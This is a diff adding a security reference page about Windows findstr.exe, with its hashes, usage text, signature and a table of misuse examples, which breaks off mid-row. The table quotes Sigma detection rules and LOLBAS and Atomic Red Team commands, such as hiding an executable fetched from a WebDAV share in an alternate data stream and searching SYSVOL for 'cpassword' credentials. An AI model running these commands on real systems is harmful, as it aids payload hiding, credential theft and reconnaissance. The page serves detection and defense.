@@ -1,0 +1,1006 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>findstr.exe | Find String (QGREP) Utility &#124; STRONTIC</title>
+<meta name="description" content="What is findstr.exe?">
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="STRONTIC">
+<meta property="og:title" content="findstr.exe | Find String (QGREP) Utility">
+<meta property="og:url" content="https://strontic.github.io/xcyclopedia/library/findstr.exe-720035DACA8632C82521721E367DBFE7.html">
+
+
+  <meta property="og:description" content="What is findstr.exe?">
+
+
+
+
+
+  <meta name="twitter:site" content="@strontic20">
+  <meta name="twitter:title" content="findstr.exe | Find String (QGREP) Utility">
+  <meta name="twitter:description" content="What is findstr.exe?">
+  <meta name="twitter:url" content="https://strontic.github.io/xcyclopedia/library/findstr.exe-720035DACA8632C82521721E367DBFE7.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://strontic.github.io/xcyclopedia/library/findstr.exe-720035DACA8632C82521721E367DBFE7.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Organization",
+      "url": "https://strontic.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="STRONTIC Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--splash wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/strontic-favicon_large_gray.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          STRONTIC
+          <span class="site-subtitle">Security. Automation. Analytics.</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/xcyclopedia/intro">xCyclopedia</a>
+            </li><li class="masthead__menu-item">
+              <a href="https://github.com/strontic">Github</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://strontic.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+		
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/xcyclopedia" itemprop="item"><span itemprop="name">Xcyclopedia</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+		
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/xcyclopedia/library" itemprop="item"><span itemprop="name">Library</span></a>
+          <meta itemprop="position" content="3" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">findstr.exe | Find String (QGREP) Utility</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  <article class="splash" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="            findstr.exe      Find String (QGREP) Utility      ">
+    <meta itemprop="description" content="What is findstr.exe?">
+    
+    
+
+    <section class="page__content" itemprop="text">
+      <h1 id="findstrexe">findstr.exe</h1>
+
+<ul>
+  <li>File Path: <code class="language-plaintext highlighter-rouge">C:\WINDOWS\system32\findstr.exe</code></li>
+  <li>Description: Find String (QGREP) Utility</li>
+</ul>
+
+<h2 id="hashes">Hashes</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Hash</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MD5</td>
+      <td><code class="language-plaintext highlighter-rouge">720035DACA8632C82521721E367DBFE7</code></td>
+    </tr>
+    <tr>
+      <td>SHA1</td>
+      <td><code class="language-plaintext highlighter-rouge">9776565DC57CCF0E51B7A657A89E0610B0FFFA2B</code></td>
+    </tr>
+    <tr>
+      <td>SHA256</td>
+      <td><code class="language-plaintext highlighter-rouge">E09620769585ACDA7F33096F8CACC609D1BFA327D9DA051A597FFFFEFD96172D</code></td>
+    </tr>
+    <tr>
+      <td>SHA384</td>
+      <td><code class="language-plaintext highlighter-rouge">885B48B3137F13EF53A585AD34954016BBEB52F450DC7AAC7CB1F921594BD1470545327C9C193DFF74CB9A45840AC3B5</code></td>
+    </tr>
+    <tr>
+      <td>SHA512</td>
+      <td><code class="language-plaintext highlighter-rouge">8387F391A718DE391D9788919F6053635DB367CC296E32B232765123D91E03C2B28E6449848AA472ADA9D622BC5906894CBA234035093168F5AB2CEF2AA4FDE9</code></td>
+    </tr>
+    <tr>
+      <td>SSDEEP</td>
+      <td><code class="language-plaintext highlighter-rouge">768:JH5IEkl2sPp+bHEvHnmFm5Puf61UXmJXEYQTUDtHHtSWfcLS9st0/63:pqYrbHEvmWuy1wmh6UNHQYkSSt0/63</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="runtime-data">Runtime Data</h2>
+
+<h3 id="usage-stdout">Usage (stdout):</h3>
+<div class="language-cmhg highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ni">Searches</span> <span class="ni">for</span> <span class="ni">strings</span> <span class="ni">in</span> <span class="ni">files</span><span class="err">.</span>
+
+<span class="ni">FINDSTR</span> <span class="err">[</span><span class="p">/</span><span class="err">B]</span> <span class="err">[</span><span class="p">/</span><span class="err">E]</span> <span class="err">[</span><span class="p">/</span><span class="err">L]</span> <span class="err">[</span><span class="p">/</span><span class="err">R]</span> <span class="err">[</span><span class="p">/</span><span class="err">S]</span> <span class="err">[</span><span class="p">/</span><span class="err">I]</span> <span class="err">[</span><span class="p">/</span><span class="err">X]</span> <span class="err">[</span><span class="p">/</span><span class="err">V]</span> <span class="err">[</span><span class="p">/</span><span class="err">N]</span> <span class="err">[</span><span class="p">/</span><span class="err">M]</span> <span class="err">[</span><span class="p">/</span><span class="err">O]</span> <span class="err">[</span><span class="p">/</span><span class="err">P]</span> <span class="err">[</span><span class="p">/</span><span class="err">F:</span><span class="ni">file</span><span class="err">]</span>
+        <span class="err">[</span><span class="p">/</span><span class="err">C:</span><span class="ni">string</span><span class="err">]</span> <span class="err">[</span><span class="p">/</span><span class="err">G:</span><span class="ni">file</span><span class="err">]</span> <span class="err">[</span><span class="p">/</span><span class="err">D:</span><span class="ni">dir</span> <span class="ni">list</span><span class="err">]</span> <span class="err">[</span><span class="p">/</span><span class="err">A:</span><span class="ni">color</span> <span class="ni">attributes</span><span class="err">]</span> <span class="err">[</span><span class="p">/</span><span class="ni">OFF</span><span class="err">[</span><span class="ni">LINE</span><span class="err">]]</span>
+        <span class="ni">strings</span> <span class="err">[[</span><span class="kd">drive:</span><span class="err">][</span><span class="ni">path</span><span class="err">]</span><span class="ni">filename</span><span class="err">[</span> <span class="err">...]]</span>
+
+  <span class="p">/</span><span class="err">B</span>         <span class="ni">Matches</span> <span class="ni">pattern</span> <span class="ni">if</span> <span class="ni">at</span> <span class="ni">the</span> <span class="ni">beginning</span> <span class="ni">of</span> <span class="err">a</span> <span class="ni">line</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">E</span>         <span class="ni">Matches</span> <span class="ni">pattern</span> <span class="ni">if</span> <span class="ni">at</span> <span class="ni">the</span> <span class="ni">end</span> <span class="ni">of</span> <span class="err">a</span> <span class="ni">line</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">L</span>         <span class="ni">Uses</span> <span class="ni">search</span> <span class="ni">strings</span> <span class="ni">literally</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">R</span>         <span class="ni">Uses</span> <span class="ni">search</span> <span class="ni">strings</span> <span class="ni">as</span> <span class="ni">regular</span> <span class="ni">expressions</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">S</span>         <span class="ni">Searches</span> <span class="ni">for</span> <span class="ni">matching</span> <span class="ni">files</span> <span class="ni">in</span> <span class="ni">the</span> <span class="ni">current</span> <span class="ni">directory</span> <span class="ni">and</span> <span class="ni">all</span>
+             <span class="ni">subdirectories</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">I</span>         <span class="ni">Specifies</span> <span class="ni">that</span> <span class="ni">the</span> <span class="ni">search</span> <span class="ni">is</span> <span class="ni">not</span> <span class="ni">to</span> <span class="ni">be</span> <span class="ni">case</span><span class="err">-</span><span class="ni">sensitive</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">X</span>         <span class="ni">Prints</span> <span class="ni">lines</span> <span class="ni">that</span> <span class="ni">match</span> <span class="ni">exactly</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">V</span>         <span class="ni">Prints</span> <span class="ni">only</span> <span class="ni">lines</span> <span class="ni">that</span> <span class="ni">do</span> <span class="ni">not</span> <span class="ni">contain</span> <span class="err">a</span> <span class="ni">match</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">N</span>         <span class="ni">Prints</span> <span class="ni">the</span> <span class="ni">line</span> <span class="ni">number</span> <span class="ni">before</span> <span class="ni">each</span> <span class="ni">line</span> <span class="ni">that</span> <span class="ni">matches</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">M</span>         <span class="ni">Prints</span> <span class="ni">only</span> <span class="ni">the</span> <span class="ni">filename</span> <span class="ni">if</span> <span class="err">a</span> <span class="ni">file</span> <span class="ni">contains</span> <span class="err">a</span> <span class="ni">match</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">O</span>         <span class="ni">Prints</span> <span class="ni">character</span> <span class="ni">offset</span> <span class="ni">before</span> <span class="ni">each</span> <span class="ni">matching</span> <span class="ni">line</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">P</span>         <span class="ni">Skip</span> <span class="ni">files</span> <span class="ni">with</span> <span class="ni">non</span><span class="err">-</span><span class="ni">printable</span> <span class="ni">characters</span><span class="err">.</span>
+  <span class="p">/</span><span class="ni">OFF</span><span class="err">[</span><span class="ni">LINE</span><span class="err">]</span> <span class="ni">Do</span> <span class="ni">not</span> <span class="ni">skip</span> <span class="ni">files</span> <span class="ni">with</span> <span class="ni">offline</span> <span class="ni">attribute</span> <span class="ni">set</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">A:</span><span class="ni">attr</span>    <span class="ni">Specifies</span> <span class="ni">color</span> <span class="ni">attribute</span> <span class="ni">with</span> <span class="ni">two</span> <span class="ni">hex</span> <span class="ni">digits</span><span class="err">.</span> <span class="ni">See</span> <span class="s">"color /?"</span>
+  <span class="p">/</span><span class="err">F:</span><span class="ni">file</span>    <span class="ni">Reads</span> <span class="ni">file</span> <span class="ni">list</span> <span class="ni">from</span> <span class="ni">the</span> <span class="ni">specified</span> <span class="ni">file</span><span class="p">(/</span> <span class="ni">stands</span> <span class="ni">for</span> <span class="ni">console</span><span class="p">)</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">C:</span><span class="ni">string</span>  <span class="ni">Uses</span> <span class="ni">specified</span> <span class="ni">string</span> <span class="ni">as</span> <span class="err">a</span> <span class="ni">literal</span> <span class="ni">search</span> <span class="ni">string</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">G:</span><span class="ni">file</span>    <span class="ni">Gets</span> <span class="ni">search</span> <span class="ni">strings</span> <span class="ni">from</span> <span class="ni">the</span> <span class="ni">specified</span> <span class="ni">file</span><span class="p">(/</span> <span class="ni">stands</span> <span class="ni">for</span> <span class="ni">console</span><span class="p">)</span><span class="err">.</span>
+  <span class="p">/</span><span class="err">D:</span><span class="ni">dir</span>     <span class="ni">Search</span> <span class="err">a</span> <span class="ni">semicolon</span> <span class="ni">delimited</span> <span class="ni">list</span> <span class="ni">of</span> <span class="ni">directories</span>
+  <span class="ni">strings</span>    <span class="ni">Text</span> <span class="ni">to</span> <span class="ni">be</span> <span class="ni">searched</span> <span class="ni">for</span><span class="err">.</span>
+  <span class="err">[</span><span class="kd">drive:</span><span class="err">][</span><span class="ni">path</span><span class="err">]</span><span class="ni">filename</span>
+             <span class="ni">Specifies</span> <span class="err">a</span> <span class="ni">file</span> <span class="ni">or</span> <span class="ni">files</span> <span class="ni">to</span> <span class="ni">search</span><span class="err">.</span>
+
+<span class="ni">Use</span> <span class="ni">spaces</span> <span class="ni">to</span> <span class="ni">separate</span> <span class="ni">multiple</span> <span class="ni">search</span> <span class="ni">strings</span> <span class="ni">unless</span> <span class="ni">the</span> <span class="ni">argument</span> <span class="ni">is</span> <span class="ni">prefixed</span>
+<span class="ni">with</span> <span class="p">/</span><span class="err">C.</span>  <span class="ni">For</span> <span class="ni">example</span><span class="p">,</span> <span class="err">'</span><span class="ni">FINDSTR</span> <span class="s">"hello there"</span> <span class="err">x.y'</span> <span class="ni">searches</span> <span class="ni">for</span> <span class="s">"hello"</span> <span class="ni">or</span>
+<span class="s">"there"</span> <span class="ni">in</span> <span class="ni">file</span> <span class="err">x.y.</span>  <span class="err">'</span><span class="ni">FINDSTR</span> <span class="p">/</span><span class="err">C:</span><span class="s">"hello there"</span> <span class="err">x.y'</span> <span class="ni">searches</span> <span class="ni">for</span>
+<span class="s">"hello there"</span> <span class="ni">in</span> <span class="ni">file</span> <span class="err">x.y.</span>
+
+<span class="ni">Regular</span> <span class="ni">expression</span> <span class="ni">quick</span> <span class="kd">reference:</span>
+  <span class="err">.</span>        <span class="ni">Wildcard</span><span class="err">:</span> <span class="ni">any</span> <span class="ni">character</span>
+  <span class="err">*</span>        <span class="ni">Repeat</span><span class="err">:</span> <span class="ni">zero</span> <span class="ni">or</span> <span class="ni">more</span> <span class="ni">occurrences</span> <span class="ni">of</span> <span class="ni">previous</span> <span class="ni">character</span> <span class="ni">or</span> <span class="ni">class</span>
+  <span class="err">^</span>        <span class="ni">Line</span> <span class="kd">position:</span> <span class="ni">beginning</span> <span class="ni">of</span> <span class="ni">line</span>
+  <span class="err">$</span>        <span class="ni">Line</span> <span class="kd">position:</span> <span class="ni">end</span> <span class="ni">of</span> <span class="ni">line</span>
+  <span class="err">[</span><span class="ni">class</span><span class="err">]</span>  <span class="ni">Character</span> <span class="kd">class:</span> <span class="ni">any</span> <span class="ni">one</span> <span class="ni">character</span> <span class="ni">in</span> <span class="ni">set</span>
+  <span class="err">[^</span><span class="ni">class</span><span class="err">]</span> <span class="ni">Inverse</span> <span class="kd">class:</span> <span class="ni">any</span> <span class="ni">one</span> <span class="ni">character</span> <span class="ni">not</span> <span class="ni">in</span> <span class="ni">set</span>
+  <span class="err">[x-y]</span>    <span class="ni">Range</span><span class="err">:</span> <span class="ni">any</span> <span class="ni">characters</span> <span class="ni">within</span> <span class="ni">the</span> <span class="ni">specified</span> <span class="ni">range</span>
+  <span class="err">\x</span>       <span class="ni">Escape</span><span class="err">:</span> <span class="ni">literal</span> <span class="ni">use</span> <span class="ni">of</span> <span class="ni">metacharacter</span> <span class="err">x</span>
+  <span class="err">\&lt;</span><span class="ni">xyz</span>    <span class="ni">Word</span> <span class="kd">position:</span> <span class="ni">beginning</span> <span class="ni">of</span> <span class="ni">word</span>
+  <span class="ni">xyz</span><span class="err">\&gt;</span>    <span class="ni">Word</span> <span class="kd">position:</span> <span class="ni">end</span> <span class="ni">of</span> <span class="ni">word</span>
+
+<span class="ni">For</span> <span class="ni">full</span> <span class="ni">information</span> <span class="ni">on</span> <span class="ni">FINDSTR</span> <span class="ni">regular</span> <span class="ni">expressions</span> <span class="ni">refer</span> <span class="ni">to</span> <span class="ni">the</span> <span class="ni">online</span> <span class="ni">Command</span>
+<span class="ni">Reference</span><span class="err">.</span>
+
+</code></pre></div></div>
+
+<h3 id="usage-stderr">Usage (stderr):</h3>
+<div class="language-cmhg highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ni">FINDSTR</span><span class="err">:</span> <span class="p">/</span><span class="err">h</span> <span class="ni">ignored</span>
+<span class="ni">FINDSTR</span><span class="err">:</span> <span class="ni">Bad</span> <span class="ni">command</span> <span class="ni">line</span>
+
+</code></pre></div></div>
+
+<h3 id="child-processes">Child Processes:</h3>
+<p>conhost.exe</p>
+
+<h2 id="signature">Signature</h2>
+
+<ul>
+  <li>Status: Signature verified.</li>
+  <li>Serial: <code class="language-plaintext highlighter-rouge">330000023241FB59996DCC4DFF000000000232</code></li>
+  <li>Thumbprint: <code class="language-plaintext highlighter-rouge">FF82BC38E1DA5E596DF374C53E3617F7EDA36B06</code></li>
+  <li>Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</li>
+  <li>Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</li>
+</ul>
+
+<h2 id="file-metadata">File Metadata</h2>
+
+<ul>
+  <li>Original Filename: FINDSTR.EXE.MUI</li>
+  <li>Product Name: Microsoft Windows Operating System</li>
+  <li>Company Name: Microsoft Corporation</li>
+  <li>File Version: 10.0.18362.1 (WinBuild.160101.0800)</li>
+  <li>Product Version: 10.0.18362.1</li>
+  <li>Language: English (United States)</li>
+  <li>Legal Copyright:  Microsoft Corporation. All rights reserved.</li>
+</ul>
+
+<h2 id="possible-misuse">Possible Misuse</h2>
+
+<p><em>The following table contains possible examples of <code class="language-plaintext highlighter-rouge">findstr.exe</code> being misused. While <code class="language-plaintext highlighter-rouge">findstr.exe</code> is <strong>not</strong> inherently malicious, its legitimate functionality can be abused for malicious purposes.</em></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Source</th>
+      <th>Source File</th>
+      <th>Example</th>
+      <th>License</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml">win_susp_findstr_lnk.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">title: Findstr Launching .lnk File</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml">win_susp_findstr_lnk.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">description: Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml">win_susp_findstr_lnk.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image: '*\findstr.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml">sysmon_suspicious_remote_thread.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\findstr.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml">Findstr.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Name: Findstr.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml">Findstr.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe &gt; c:\ADS\file.txt:file.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml">Findstr.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe &gt; c:\ADS\file.txt:file.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml">Findstr.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: findstr /S /I cpassword \\sysvol\policies\*.xml</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml">Findstr.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe &gt; c:\ADS\file.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml">Findstr.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\System32\findstr.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml">Findstr.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\SysWOW64\findstr.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
+      <td>- Atomic Test #3: Extracting passwords with findstr [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
+      <td>- Atomic Test #1: GPP Passwords (findstr) [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
+      <td>- Atomic Test #3: Extracting passwords with findstr [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
+      <td>- Atomic Test #1: GPP Passwords (findstr) [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md">T1003.003.md</a></td>
+      <td>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md">T1012.md</a></td>
+      <td>reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2&gt;nul | findstr /Ri “.*.sys$”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md">T1018.md</a></td>
+      <td>$localip = ((ipconfig | findstr [0-9]..)[0]).Split()[-1]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md">T1033.md</a></td>
+      <td>for /F “tokens=1,2” %i in (‘qwinsta /server:#{computer_name} ^| findstr “Active Disc”’) do @echo %i | find /v “#” | find /v “console” || echo %j &gt; computers.txt</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md">T1033.md</a></td>
+      <td>@FOR /F %n in (computers.txt) DO @FOR /F “tokens=1,2” %i in (‘qwinsta /server:%n ^| findstr “Active Disc”’) do @echo %i | find /v “#” | find /v “console” || echo %j &gt; usernames.txt</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md">T1119.md</a></td>
+      <td>dir c: /b /s .docx | findstr /e .docx</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
